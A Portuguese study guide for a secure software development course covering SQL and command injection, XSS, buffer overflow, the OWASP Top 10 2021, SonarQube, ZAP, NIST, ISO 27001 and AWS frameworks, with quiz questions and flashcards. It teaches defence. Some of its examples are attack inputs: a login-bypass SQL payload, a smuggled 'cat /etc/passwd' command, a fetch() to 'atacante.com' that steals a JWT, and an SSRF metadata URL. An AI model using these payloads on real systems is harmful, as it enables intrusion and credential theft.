Aula 1 · FundamentosVulnerabilidade × ameaça × ataque × intrusão

Quatro palavras que o senso comum usa como sinônimos, mas que a prova trata como etapas diferentes de um mesmo evento. A ordem é: existe uma vulnerabilidade → uma ameaça pode explorá-la → um ataque é a tentativa de exploração → a intrusão é o ataque que deu certo.

Dois termos vizinhos completam o vocabulário: exploit é o código ou a técnica concreta que explora uma vulnerabilidade específica, e risco é a combinação da probabilidade de a ameaça se concretizar com o impacto que ela causaria (risco ≈ probabilidade × impacto). Uma vulnerabilidade grave num sistema sem exposição pode ter risco baixo; uma vulnerabilidade simples numa tela pública tem risco alto.

A tríade CIA — o que a segurança protege

  • Confidencialidade: só quem tem autorização lê o dado. Quebrada por vazamento, sniffing, SQL Injection que lê tabelas.
  • Integridade: o dado não é alterado sem autorização. Quebrada por adulteração, MITM que modifica a mensagem.
  • Disponibilidade: o sistema responde quando precisa. Quebrada por DoS/DDoS, ransomware.

A Resolução do Bacen citada na aula usa exatamente esses três termos ("integridade, confidencialidade e disponibilidade").

Questão

Numa revisão de código, a equipe descobre que um endpoint monta a query SQL concatenando o texto digitado pelo usuário. Ninguém explorou isso ainda. Como esse achado se classifica?

  • AIntrusão, porque o dado do usuário chega ao banco.
  • BVulnerabilidade, porque é uma falha explorável que existe mesmo sem ataque.
  • CAtaque, porque o código malicioso já está no sistema.
  • DAmeaça, porque é o agente que causará o dano.
A falha existe no código independentemente de alguém explorá-la: é uma vulnerabilidade. Ataque exigiria uma tentativa de exploração; intrusão exigiria acesso obtido; ameaça é o agente (o atacante, o bot), não a falha.

Security by Design

Security by Design (desenvolvimento seguro por design) é tratar a segurança como requisito desde o início do projeto, construída junto com o software — em vez de corrigir vulnerabilidades depois que ele está pronto. A aula compara com o TDD: assim como o teste vem antes do código, a análise de segurança acompanha cada etapa desde as primeiras linhas. Esse movimento de trazer a segurança para o começo do ciclo também é chamado de shift-left.

Princípios correlatos que aparecem nas alternativas

  • Defesa em profundidade: várias camadas independentes de proteção (WAF + validação + prepared statement + menor privilégio no banco); se uma falha, a outra segura.
  • Fail secure (falhar fechado): em caso de erro, negar o acesso em vez de liberar.
  • Secure by Default: a configuração padrão já é a mais segura (ex.: MFA ligado por padrão). Complementa o Security by Design; a CISA (agência de cibersegurança dos EUA) promove os dois.
  • Privacy by Design: o equivalente para privacidade, exigido pela LGPD/GDPR — ver Tópico 10.
Questão

Ao desenhar a infraestrutura, o arquiteto coloca o banco de dados numa sub-rede privada, sem acesso direto da internet, e separa a VPC das APIs da VPC dos bancos. Qual elemento do Security by Design isso aplica?

  • APrincípio do menor privilégio.
  • BValidação e sanitização de dados.
  • CSegmentação de rede.
  • DTeste de segurança contínuo.
Isolar redes para que um comprometimento atinja só uma parte do sistema é segmentação de rede — é o exemplo literal da aula. Menor privilégio fala de permissões de usuários/serviços, não de topologia de rede; validação trata do input; teste contínuo trata de varreduras ao longo do ciclo.

⚠ Pegadinha

Não é preciso seguir todas as normas para considerar um software seguro — seria quase impossível. A recomendação da aula é escolher uma base (ex.: ISO 27001/27002, por serem internacionais) ou a que regula o seu mercado (HIPAA, Bacen). A exceção são LGPD e GDPR: são leis, não sugestões, e por isso precisam ser cumpridas.

ℹ Sobre a norma do Bacen

O material cita a "Resolução Bacen nº 4.553/2017". A norma do Conselho Monetário Nacional que trata especificamente da política de segurança cibernética das instituições financeiras é a Resolução CMN nº 4.658/2018, hoje substituída pela 4.893/2021. Na prova, o que importa é a ideia: o setor financeiro brasileiro tem regulação própria de segurança cibernética emitida pelo Banco Central/CMN.

Questão

Uma empresa quer obter uma certificação que comprove a clientes que mantém um Sistema de Gestão de Segurança da Informação. Qual norma define os requisitos auditáveis para essa certificação?

  • AISO/IEC 27001.
  • BISO/IEC 27002.
  • CGDPR.
  • DOWASP Top 10.
A 27001 define os requisitos do SGSI e é a norma contra a qual a organização é certificada. A 27002 é um guia de controles e não certifica; a GDPR é uma lei europeia de dados pessoais; o OWASP Top 10 é um documento de conscientização, não uma norma de certificação.

⚠ Pegadinha — DoS × DDoS e Sniffing × MITM

DoS e DDoS têm o mesmo objetivo (indisponibilidade); a diferença é só a origem: um ponto × muitos pontos (botnet). Já sniffing é passivo (só escuta), enquanto o MITM é ativo: o atacante fica no meio e pode alterar as mensagens. Os dois são neutralizados pela mesma defesa: criptografia em trânsito.

Questão

Um atacante envia à vítima um link com um ID de sessão que ele próprio gerou. A vítima faz login por esse link e o sistema mantém o mesmo ID. Agora o atacante usa esse ID e acessa a conta. Qual ataque é esse e qual a defesa mais direta?

  • AMan-in-the-Middle; usar HTTPS.
  • BForça bruta; bloquear a conta após 5 tentativas.
  • CXSS refletido; aplicar output encoding.
  • DSession Fixation; gerar um novo ID de sessão no momento do login.
O atacante fixou a sessão antes do login — é Session Fixation. Se o servidor trocar o ID ao autenticar, o ID que o atacante conhece deixa de valer. MITM exige interceptar o tráfego; força bruta adivinha credenciais; XSS injeta script na página.

SQL Injection e Command Injection

Os dois ataques têm a mesma raiz: o programa mistura dado com comando. O input do usuário, que deveria ser só um valor, é concatenado numa string que outro interpretador executa — o banco de dados (SQL Injection) ou o shell do sistema operacional (Command Injection).

// ✗ VULNERÁVEL — o input vira parte do comando SQL
query = "SELECT * FROM usuarios WHERE email = '" + email + "' AND senha = '" + senha + "'"

// Input do atacante no campo email:   ' OR '1'='1' --
// Query resultante:
SELECT * FROM usuarios WHERE email = '' OR '1'='1' --' AND senha = '...'
// '1'='1' é sempre verdadeiro e o -- comenta o resto → login sem senha

// ✓ SEGURO — query parametrizada (prepared statement)
query = "SELECT * FROM usuarios WHERE email = ? AND senha_hash = ?"
db.execute(query, [email, hashDaSenha])   // o banco trata os valores só como dados
// ✗ VULNERÁVEL — Command Injection
exec("ping -c 1 " + host)
// Input do atacante:   8.8.8.8; cat /etc/passwd
// O shell executa os dois comandos

// ✓ SEGURO — sem shell, argumentos separados e validados por allowlist
if (!/^[0-9.]+$/.test(host)) throw new Error("host inválido")
execFile("ping", ["-c", "1", host])

⚠ Pegadinha

A defesa primária contra SQL Injection é a query parametrizada, não a sanitização nem a validação no front-end. Validação só no navegador não protege nada: o atacante chama a API diretamente. E usar ORM não imuniza: um query("... " + input) cru dentro do ORM continua vulnerável.

Questão

Qual é a contramedida mais eficaz contra SQL Injection?

  • AValidar os campos com JavaScript no navegador antes do envio.
  • BUsar queries parametrizadas (prepared statements), que separam o comando SQL dos valores.
  • CCriptografar a conexão com o banco usando TLS.
  • DEsconder as mensagens de erro do banco de dados.
Com a query parametrizada, o banco recebe o comando e os valores separadamente — o input nunca é interpretado como SQL. Validação no navegador é contornável chamando a API direto; TLS protege o trânsito, não a montagem da query; esconder erros só dificulta a exploração (ainda existe SQL Injection "às cegas", o blind SQLi).

Cross-Site Scripting (XSS)

No XSS, o atacante consegue que a página de um site legítimo execute um JavaScript dele no navegador de outros usuários. Como o script roda com a "identidade" do site, ele lê cookies, tokens e o conteúdo da página, e pode agir em nome da vítima. A diferença para o SQL Injection é o alvo: SQLi ataca o servidor/banco; XSS ataca o navegador do usuário, usando o servidor como veículo.

XSS e autenticação JWT — o ponto citado na aula

Um JWT (JSON Web Token) é o token de autenticação que o front-end envia a cada requisição. Onde ele fica guardado decide o estrago de um XSS:

  • localStorage / sessionStorage: qualquer JavaScript da página lê. Um único XSS faz fetch('https://atacante.com?t=' + localStorage.token) e o atacante passa a usar o token de qualquer lugar até ele expirar.
  • Cookie HttpOnly + Secure + SameSite: o JavaScript não consegue ler o cookie (HttpOnly), ele só trafega em HTTPS (Secure) e não é enviado em requisições de outros sites (SameSite, que mitiga CSRF). O XSS ainda pode agir dentro da página, mas não consegue exfiltrar o token.
  • Mitigações adicionais: token de vida curta + refresh token, revogação no servidor.

⚠ Pegadinha — XSS × CSRF

No XSS, o script do atacante executa dentro do site vulnerável. No CSRF (Cross-Site Request Forgery), nenhum script roda no site: uma página do atacante faz o navegador da vítima enviar uma requisição autenticada (o cookie vai junto automaticamente). Defesas diferentes: XSS → encoding/CSP; CSRF → token anti-CSRF e SameSite. Note também que no Top 10 2021 o XSS deixou de ser categoria própria e passou a fazer parte de A03 Injection.

Questão

Um usuário publica num fórum um comentário contendo um <script>. O fórum salva o comentário e, a partir daí, todo visitante que abre o tópico tem seus cookies enviados a um servidor externo. Qual a classificação?

  • AXSS armazenado (persistente).
  • BXSS refletido.
  • CSQL Injection.
  • DCSRF.
O script foi gravado e é servido a todos os visitantes: XSS armazenado (como o Samy worm). No refletido, o script vem na requisição e não é salvo; SQL Injection ataca o banco, não o navegador; CSRF não executa script no site — força uma requisição a partir de outra página.
Questão

Uma SPA guarda o JWT no localStorage. A equipe teme que um XSS roube o token. Qual mudança de armazenamento mais reduz esse risco?

  • AMover o token para o sessionStorage.
  • BCodificar o token em Base64 antes de salvar.
  • CEntregar o token num cookie HttpOnly, Secure e SameSite.
  • DGuardar o token numa variável global do JavaScript.
Um cookie HttpOnly é inacessível ao JavaScript, então o script injetado não consegue lê-lo nem enviá-lo para fora. sessionStorage e variável global continuam legíveis por qualquer script da página; Base64 é codificação, não criptografia — qualquer um decodifica.

Buffer overflow

Um buffer é uma área de memória de tamanho fixo reservada para guardar um dado (ex.: char nome[16]). O buffer overflow (estouro de buffer) acontece quando o programa escreve mais dados do que o buffer comporta e o excedente sobrescreve a memória vizinha. Se o atacante controla esse excedente, ele pode sobrescrever o endereço de retorno de uma função e desviar a execução para um código dele — execução arbitrária de código. No mínimo, o programa trava (o que já é negação de serviço).

// C — ✗ VULNERÁVEL: strcpy não verifica o tamanho do destino
void saudacao(char *input) {
    char nome[16];
    strcpy(nome, input);       // input com 200 bytes estoura nome[16]
}

// ✓ Mais seguro: limitar a cópia ao tamanho do buffer
snprintf(nome, sizeof(nome), "%s", input);

Onde acontece e como se previne

  • Onde: linguagens sem verificação automática de limites de memória — C e C++. Em Java, C#, Python, Go e Rust (código seguro), o runtime/compilador impede a escrita fora do limite.
  • Prevenção no código: validar o tamanho do input (é o "buffer overflow" que a Aula 1 cita em Validação e Sanitização), usar funções com limite (strncpy, snprintf) e análise estática (o Cppcheck da Aula 4 detecta esse tipo de erro).
  • Prevenção no sistema operacional/compilador: stack canaries (valor-sentinela que detecta a sobrescrita), ASLR (endereços de memória aleatórios a cada execução) e DEP/NX (memória de dados marcada como não executável).

Aula 3 · Bibliotecas de softwareLicenças de software

Uma licença de software é o acordo legal que define os direitos e as restrições de uso, modificação e distribuição de um código. Importar uma biblioteca é aceitar a licença dela — e isso pode limitar como você distribui ou vende o seu próprio produto. A aula dá três motivos para olhar a licença antes de importar:

  • Compatibilidade de licenças: a licença da biblioteca precisa ser compatível com a do seu projeto, para não gerar conflito legal.
  • Responsabilidade legal: usar uma biblioteca em desacordo com a licença viola direitos autorais e expõe o projeto a ações judiciais.
  • Liberdade de uso: licenças abertas promovem liberdade de uso e modificação; se você precisa proteger propriedade intelectual, escolha bibliotecas cujas licenças não obriguem a abrir o seu código.

As licenças abertas se dividem em duas famílias. Permissivas deixam você fazer quase tudo, inclusive usar em software fechado, exigindo só que o aviso de autoria seja mantido. Copyleft exigem que o software derivado seja distribuído sob a mesma licença — por isso são chamadas de "virais".

Código aberto não é domínio público: o autor continua dono e a licença dita as regras. Um repositório sem licença significa "todos os direitos reservados" — legalmente você não pode usá-lo. E a obrigação da GPL é disparada pela distribuição: usar uma lib GPL num sistema só interno não obriga a publicar nada; distribuir o produto, sim.

Riscos ao importar bibliotecas (supply chain)

Além da licença, há o risco de segurança: a biblioteca pode conter uma vulnerabilidade ou até código malicioso. Como seu app executa o código dela com as mesmas permissões que o seu, uma biblioteca comprometida compromete todos os projetos que a usam. Esse é o chamado ataque à cadeia de suprimentos de software (software supply chain).

Análise estática de código & SonarQube

A análise estática é um processo automatizado que examina o código-fonte sem executá-lo, procurando erros, vulnerabilidades, problemas de estilo e oportunidades de otimização. É o oposto do teste dinâmico, em que o programa roda e é testado em tempo real. Por avaliar o código "em repouso", ela encontra problemas antes de o programa ser executado — portanto, mais cedo e mais barato.

SonarQube — o que ele mostra e como entra no pipeline

  • Bugs: código que provavelmente se comporta errado.
  • Vulnerabilities: falhas de segurança confirmadas pelo padrão (ex.: SQL concatenado).
  • Security Hotspots: trechos sensíveis que precisam de revisão humana para decidir se são falha.
  • Code Smells: problemas de manutenibilidade (complexidade, duplicação) — somam a dívida técnica.
  • Cobertura de testes e duplicação de código.
  • Quality Gate: conjunto de condições (ex.: cobertura ≥ 80% no código novo, zero vulnerabilidades novas). Se o código não passa, o pipeline de CI falha e o merge é barrado.
  • No pipeline: o job de CI roda os testes, gera o relatório de cobertura e executa o SonarScanner, que envia a análise ao servidor SonarQube (ou ao SonarCloud, a versão SaaS).
⚠ Pegadinha

O SonarQube não executa o seu código. A cobertura que ele mostra vem de um relatório gerado pelos testes (que rodaram antes, no pipeline) e importado por ele. Também não substitui o teste dinâmico: problemas que só aparecem em execução (configuração do servidor, autenticação em runtime) exigem DAST.

Questão

Sobre a análise estática de código, assinale a alternativa correta.

  • AEla executa o programa com entradas maliciosas para observar seu comportamento.
  • BEla só pode ser feita manualmente, por revisão de pares.
  • CEla examina o código-fonte sem executá-lo e pode ser automatizada num pipeline de CI/CD, como no SonarQube.
  • DEla dispensa testes unitários, porque calcula a cobertura sozinha.
Estática = sem executar, e é justamente o tipo de verificação automatizável no pipeline. Executar com entradas maliciosas é teste dinâmico (DAST); ela é feita por ferramentas, não só manualmente; e a cobertura depende dos testes, que continuam necessários.

Questão

Logado como cliente, um usuário altera a URL de /api/faturas/1001 para /api/faturas/1002 e recebe a fatura de outro cliente. Em qual categoria do OWASP Top 10 2021 isso se enquadra?

  • AA01 — Broken Access Control.
  • BA03 — Injection.
  • CA07 — Identification and Authentication Failures.
  • DA02 — Cryptographic Failures.
O usuário está autenticado corretamente; o que falta é o servidor checar se a fatura pertence a ele — falha de autorização, ou seja, A01 (o caso clássico chamado IDOR, Insecure Direct Object Reference). Não há código injetado (A03), a identidade dele está certa (A07) e nada depende de criptografia (A02).
Questão

Uma funcionalidade "gerar prévia de link" faz o servidor baixar qualquer URL enviada pelo usuário. Um atacante envia http://169.254.169.254/latest/meta-data/ e obtém credenciais da instância EC2. Qual categoria do Top 10 2021?

  • AA05 — Security Misconfiguration.
  • BA03 — Injection, na forma de XSS.
  • CA08 — Software and Data Integrity Failures.
  • DA10 — Server-Side Request Forgery (SSRF).
O atacante faz o servidor enviar uma requisição a um destino interno que ele não alcançaria de fora: SSRF, A10 (o endereço 169.254.169.254 é o serviço de metadados das instâncias na nuvem). As 4 primeiras categorias em detalhe

A videoaula aprofunda as quatro vulnerabilidades no topo da lista de 2021. São as que mais aparecem em cenários de prova.

A01 · Broken Access Control — "você é quem diz, mas pode fazer isso?"

Controle de acesso é a regra que decide o que um usuário autenticado pode fazer. A falha acontece quando essa regra não existe, só existe no front-end ou pode ser contornada.

  • Formas comuns: IDOR (trocar o ID na URL), escalada de privilégio (usuário vira admin alterando um campo role enviado no JSON), acesso direto a rotas de admin não linkadas (forced browsing), CORS liberado para qualquer origem, JWT manipulado.
  • Prevenção: negar por padrão; checar no servidor, a cada requisição, a permissão e a propriedade do recurso; aplicar menor privilégio; registrar e alertar falhas de acesso; invalidar sessões no logout.

A02 · Cryptographic Failures — dado sensível mal protegido

Antes chamada Sensitive Data Exposure. Agrupa ausência de criptografia e uso de criptografia errada.

  • Formas comuns: tráfego em HTTP; senhas em texto puro ou com hash rápido (MD5, SHA-1) e sem salt; algoritmos obsoletos (DES, RC4); chaves fixas no código ou no repositório; certificado não validado.
  • Prevenção: classificar os dados e não guardar o que não é necessário; TLS em tudo (com HSTS); criptografar em repouso (AES-GCM); senhas com função de hash lenta e com salt (bcrypt, scrypt, Argon2); chaves num gerenciador (AWS KMS, Secrets Manager).

A03 · Injection — dado do usuário interpretado como comando

Inclui SQL, NoSQL, comando de SO, LDAP, ORM e, desde 2021, XSS.

  • Raiz: input não validado nem separado do comando.
  • Prevenção: API segura/queries parametrizadas; validação no servidor por allowlist; escape específico do interpretador quando não houver alternativa; LIMIT nas queries para reduzir o vazamento em massa; SAST e DAST no pipeline.

A04 · Insecure Design — a falha está no desenho, não no código

Categoria nova em 2021. Um design inseguro não se corrige com uma implementação perfeita: o controle de segurança necessário simplesmente nunca foi pensado.

  • Exemplos: recuperar senha com "pergunta secreta" (respostas descobríveis em redes sociais); site de ingressos sem limite de compra por usuário, permitindo que um bot compre tudo; fluxo de pagamento que confia no preço enviado pelo cliente.
  • Prevenção: modelagem de ameaças (ex.: STRIDE) nas funcionalidades críticas; casos de abuso escritos junto com as histórias de usuário; bibliotecas de padrões de design seguro; ciclo de desenvolvimento seguro — é o Security by Design da Aula 1.
⚠ Pegadinha — Insecure Design × Security Misconfiguration

A04 Insecure Design: o controle não foi projetado (não existe limite de tentativas no fluxo, a regra de negócio é explorável). A05 Security Misconfiguration: o controle existe, mas está mal configurado (senha padrão ativa, debug ligado em produção, bucket público). Pergunta-chave: "corrigir a configuração resolve?" Se sim, é A05; se é preciso redesenhar o fluxo, é A04.

Questão

Um sistema permite recuperar a senha respondendo "qual o nome do seu primeiro animal de estimação?". A implementação está livre de bugs, mas atacantes descobrem as respostas pelas redes sociais das vítimas. Qual categoria do Top 10 2021 melhor descreve o problema?

  • AA05 — Security Misconfiguration.
  • BA03 — Injection.
  • CA04 — Insecure Design.
  • DA06 — Vulnerable and Outdated Components.
O código funciona como projetado — o problema é o próprio desenho do fluxo de recuperação, que nenhuma implementação corrige: A04 Insecure Design (o OWASP usa exatamente esse exemplo). Não é configuração (A05), não há input interpretado como comando (A03), nem biblioteca desatualizada (A06).

Recebe a lista de componentes no formato de SBOM (CycloneDX). Para tirar mais proveito, a aula recomenda:

  • Integrar ao pipeline de CI: avaliar as dependências automaticamente a cada build.
  • Monitorar o portfólio regularmente: uma biblioteca segura hoje pode ganhar uma CVE amanhã.
  • Política de aceitação de dependências: definir quais são permitidas e quais são proibidas.
  • Treinar e sensibilizar a equipe sobre a gestão segura de dependências.

O Juice Shop e o WebGoat são aplicações deliberadamente inseguras para praticar a exploração e a correção de vulnerabilidades sem risco para sistemas reais. Benefícios citados: aprendizado prático em ambiente seguro, sensibilização para segurança e aprimoramento de habilidades. A aula compara os dois em quatro critérios:

OWASP Web Security Testing Guide (WSTG)

Guia abrangente e prático de como testar a segurança de aplicações web — do básico às técnicas avançadas —, revisado periodicamente pela comunidade. Seções citadas na aula:

  • Information Gathering: descobrir tecnologias usadas, estrutura de diretórios e detalhes úteis ao atacante.
  • Configuration and Deployment Management Testing: fraquezas na configuração e na implantação.
  • Identity Management Testing: mecanismos de gestão de identidade (criação de contas, papéis).
  • Authentication Testing: força bruta, política de senha, MFA.
  • Session Management Testing: sessões que não expiram, roubadas ou não autenticadas.
  • Input Validation Testing: SQL Injection, XSS e outros ataques por input malicioso.
  • Error Handling Testing: erros e exceções que expõem informação sensível.

OWASP ZAP (Zed Attack Proxy) — o hands-on da aula

Ferramenta gratuita de DAST. Funciona como um proxy entre o navegador e a aplicação, vendo e alterando as requisições. Recursos principais: spider (mapeia as páginas), scan passivo (só observa o tráfego e aponta problemas, como cabeçalhos de segurança ausentes) e scan ativo (envia ataques reais — SQLi, XSS — e por isso só deve ser usado em ambiente autorizado). Pode rodar no pipeline de CI contra o ambiente de homologação. Desde 2023 o ZAP é mantido fora da OWASP, mas continua conhecido como "OWASP ZAP".

Aula 6 · Padrões de segurançaAWS Well-Architected Framework

O Well-Architected Framework é o conjunto de boas práticas da AWS para avaliar e melhorar arquiteturas na nuvem — um padrão que, na prática, as outras nuvens também seguem (Azure e Google Cloud têm frameworks equivalentes). Ele se organiza em 6 pilares, e a disciplina dá destaque ao de Segurança.

⚠ Pegadinha — nomes dos pilares

O material usa traduções livres ("Performance Operacional", "Resiliência"). Os nomes oficiais em português são Excelência Operacional e Confiabilidade. Itens como Escalabilidade, Disponibilidade ou Usabilidade não são pilares — são distratores comuns.

Pilar de Segurança — princípios de design

  • Base sólida de identidade: menor privilégio, separação de funções, sem credenciais de longa duração.
  • Rastreabilidade: logs e métricas de todas as ações, com alertas automáticos.
  • Segurança em todas as camadas: rede, instância, aplicação, dados (defesa em profundidade).
  • Automatizar as boas práticas de segurança (controles como código).
  • Proteger dados em trânsito e em repouso.
  • Manter pessoas longe dos dados: reduzir acesso manual direto.
  • Preparar-se para eventos de segurança: plano de resposta a incidentes e simulações.

Base de tudo: o Modelo de Responsabilidade Compartilhada — a AWS cuida da segurança da nuvem (data centers, hardware, hipervisor); o cliente cuida da segurança na nuvem (dados, IAM, configuração, criptografia, aplicação).

⚠ Pegadinha

O PCI DSS é obrigatório para quem lida com dados de cartão — mas por exigência contratual das bandeiras (via adquirentes e bancos), não é uma lei como a LGPD. E ele não trata de PIX nem de dados pessoais em geral: o escopo é o dado de cartão. Truncar/mascarar o número na tela é exigência típica.

Questão

Um e-commerce exibe na tela "Cartão final 4821" em vez do número completo, e cada atendente tem login próprio, sem contas compartilhadas. Essas práticas atendem a qual padrão, e a quais pontos dele?

  • AISO 27002 — gestão de ativos e segurança física.
  • BPCI DSS — mascarar/truncar os dados do titular e atribuir identificação única a cada pessoa com acesso.
  • CNIST CSF — funções Detectar e Responder.
  • DCIS AWS Foundations — nível 2 de armazenamento seguro.
Truncar o número do cartão e identificação única por pessoa são requisitos literais do PCI DSS. A ISO 27002 é genérica e não trata de cartão; Detectar/Responder são sobre incidentes; o CIS configura a conta AWS, não a exibição de dados de cartão.

NIST — 800-53 e as 5 funções

O NIST (National Institute of Standards and Technology — Instituto Nacional de Padrões e Tecnologia dos EUA) promove inovação por meio de ciência, padrões e tecnologia de medição. Em fevereiro de 2013, começou a trabalhar com o setor privado para reunir as melhores práticas da indústria numa estrutura de segurança cibernética, amplamente adotada desde então. A aula apresenta cinco funções essenciais, cada uma com categorias e planos de ação:

FunçãoMomentoObjetivoCategorias (exemplos)
Identificar (Identify)AntesEntender ativos, recursos críticos e riscos.Gestão de ativos, ambiente de negócios, governança, avaliação e estratégia de riscos, cadeia de suprimentos.
Proteger (Protect)AntesImplementar salvaguardas técnicas e físicas.Identidade e controle de acesso, treinamento, segurança de dados, manutenção, tecnologia de proteção.
Detectar (Detect)DuranteAlertar a organização sobre ataques.Anomalias e eventos, monitoramento contínuo, processos de detecção.
Responder (Respond)DuranteAgir adequadamente sobre o incidente.Planejamento de resposta, comunicações, análise, mitigação, melhorias.
Recuperar (Recover)DepoisRestaurar a continuidade dos negócios (resiliência).Planejamento de recuperação, melhorias, comunicações.
Mnemônico — as 5 funções, na ordem do incidente
"Identifico, Protejo, Detecto, Respondo, Recupero"
  • I · P → antes do ataque (conhecer e blindar)
  • D · R → durante (perceber e agir)
  • R → depois (voltar a operar)
⚠ Pegadinha — 800-53 × CSF

O material apresenta as 5 funções junto com o NIST 800-53, mas tecnicamente elas são do NIST Cybersecurity Framework (CSF) — o trabalho iniciado em 2013 é o CSF. O SP 800-53 é outra publicação: o catálogo de controles de segurança e privacidade (Revisão 5, de 2020), organizado em famílias (controle de acesso, auditoria, resposta a incidentes…) e com linhas de base Baixa, Moderada e Alta, exigido pela FISMA. Se a questão pedir as 5 funções, responda Identificar–Proteger–Detectar–Responder–Recuperar; se pedir o "catálogo de centenas de controles", é o 800-53. (O CSF 2.0, de 2024, adicionou uma 6ª função, Governar.)

Questão

Após um ataque de ransomware, a empresa executa seu plano para restaurar backups e retomar a operação, comunicando o andamento aos clientes. Qual função do NIST corresponde a essa atividade?

  • AIdentificar.
  • BProteger.
  • CDetectar.
  • DRecuperar.
Restaurar a operação e garantir a continuidade do negócio depois do incidente é Recuperar. Identificar e Proteger acontecem antes do ataque; Detectar é perceber o ataque. (Conter o ataque em andamento seria Responder.)

ISO 27001 e ISO 27002

Normas globalmente reconhecidas sobre SGSI — Sistema de Gestão de Segurança da Informação, o conjunto de políticas, processos e controles com que a organização gerencia seus riscos de segurança. A distinção é o ponto central: a 27001 diz O QUÊ o SGSI precisa ter (requisitos, certificável); a 27002 diz COMO implementar os controles (guia de boas práticas, não certificável).

  • Gestão de riscos eficaz: abordagem estruturada para identificar, avaliar e tratar riscos.
  • Conformidade legal e regulatória.
  • Aumento da conscientização: cultura de segurança, menos risco de erro humano.
  • Confiança dos stakeholders (clientes, parceiros).

Questão

Sobre as normas ISO/IEC 27001 e 27002, assinale a alternativa correta.

  • AA 27001 estabelece os requisitos para implementar e certificar um SGSI; a 27002 orienta a implementação dos controles de segurança.
  • BA 27002 é a norma certificável; a 27001 é apenas um guia opcional.
  • CAmbas são leis brasileiras de proteção de dados.
  • DAmbas foram criadas pela AWS e só se aplicam a ambientes de nuvem.
27001 = requisitos/certificação; 27002 = guia dos controles. A alternativa B inverte os papéis (pegadinha clássica); elas não são leis (a lei brasileira é a LGPD); e são normas internacionais da ISO/IEC, válidas para qualquer organização — a aula ressalta que não são padrões da AWS.
Questão

Qual dos itens abaixo NÃO é um pilar do AWS Well-Architected Framework?

  • ASustentabilidade.
  • BExcelência Operacional.
  • CEscalabilidade.
  • DOtimização de Custos.
Os 6 pilares são Excelência Operacional, Segurança, Confiabilidade, Eficiência de Performance, Otimização de Custos e Sustentabilidade. Escalabilidade é uma característica tratada dentro de Confiabilidade e Eficiência de Performance, não um pilar.

AutotesteFlashcards

Vulnerabilidade × ataque × intrusão?
clique
Vulnerabilidade = a falha explorável. Ataque = a tentativa de explorar. Intrusão = o ataque que deu certo (acesso efetivo).
O que é Security by Design?
clique
Segurança como requisito desde o início, construída junto com o software — não corrigida depois. 8 elementos: ameaças, superfície, menor privilégio, segmentação, validação, criptografia, teste contínuo, educação.
Defesa primária contra SQL Injection?
clique
Queries parametrizadas (prepared statements): comando e valores vão separados ao banco. Validação e menor privilégio são complementares.
Os 3 tipos de XSS?
clique
Refletido (vem na requisição, não é salvo) · Armazenado (salvo no banco, atinge todos — Samy/MySpace) · DOM-based (só no navegador, nunca passa pelo servidor).
Onde guardar o JWT para resistir a XSS?
clique
Em cookie HttpOnly (JS não lê) + Secure (só HTTPS) + SameSite (mitiga CSRF). No localStorage, qualquer script injetado rouba o token.
O que é buffer overflow?
clique
Escrever mais dados do que o buffer comporta, sobrescrevendo memória vizinha (ex.: endereço de retorno) → crash ou execução de código. Típico de C/C++.
Permissiva × copyleft?
clique
Permissiva (MIT, Apache, BSD): usa até em produto fechado, mantendo o aviso. Copyleft (GPL): o derivado distribuído deve ser GPL e com código aberto.
SAST × DAST × SCA?
clique
SAST = código sem executar (SonarQube). DAST = app rodando, atacado por fora (ZAP). SCA = dependências e CVEs (Dependency-Track, npm audit).
O que é o Quality Gate do SonarQube?
clique
Condições mínimas (cobertura, zero vulnerabilidades novas…) que o código precisa cumprir; se falhar, o pipeline de CI falha e o merge é barrado.
Top 10 2021 — as 3 categorias novas?
clique
A04 Insecure Design · A08 Software and Data Integrity Failures · A10 SSRF.
Para onde foram XSS, XXE e Insecure Deserialization em 2021?
clique
XSS → A03 Injection · XXE → A05 Security Misconfiguration · Insecure Deserialization → A08 Integrity Failures.
Juice Shop × WebGoat?
clique
WebGoat: lições isoladas por vulnerabilidade, várias tecnologias. Juice Shop: e-commerce realista com desafios contínuos, só JavaScript/Node.js.
WA Tool × Trusted Advisor × Security Hub?
clique
WA Tool: questionário sobre os 6 pilares. Trusted Advisor: checagens automáticas (custo, performance, segurança, limites). Security Hub: conformidade com padrões (CIS, PCI, NIST) + agregação de achados.
ISO 27001 × 27002?
clique
27001 = o quê: requisitos do SGSI, certificável. 27002 = como: guia de implementação dos controles, não certificável.

🎯 Releia antes de entregar a prova
  • Vulnerabilidade existe sem ataque; ataque pode falhar; intrusão é o sucesso.
  • Não é preciso seguir todas as normas — mas LGPD e GDPR são leis e são obrigatórias.

  • DoS = 1 origem; DDoS = botnet. Sniffing é passivo; MITM pode alterar.
  • GPL obriga abrir o derivado distribuído; MIT/Apache/BSD não. Sem licença = sem permissão de uso.
  • Análise estática não executa o código; SonarQube = SAST, ZAP = DAST, Dependency-Track = SCA.
  • Top 10 2021: A01 Broken Access Control no topo; novas: A04, A08, A10; fundidas: XSS→A03, XXE→A05, Deserialization→A08.
  • Insecure Design (não foi projetado) ≠ Misconfiguration (foi projetado, mas está mal configurado).
  • O Top 10 é conscientização, não norma de certificação. WSTG = como testar.
  • WebGoat = lições; Juice Shop = e-commerce realista, só Node.js.
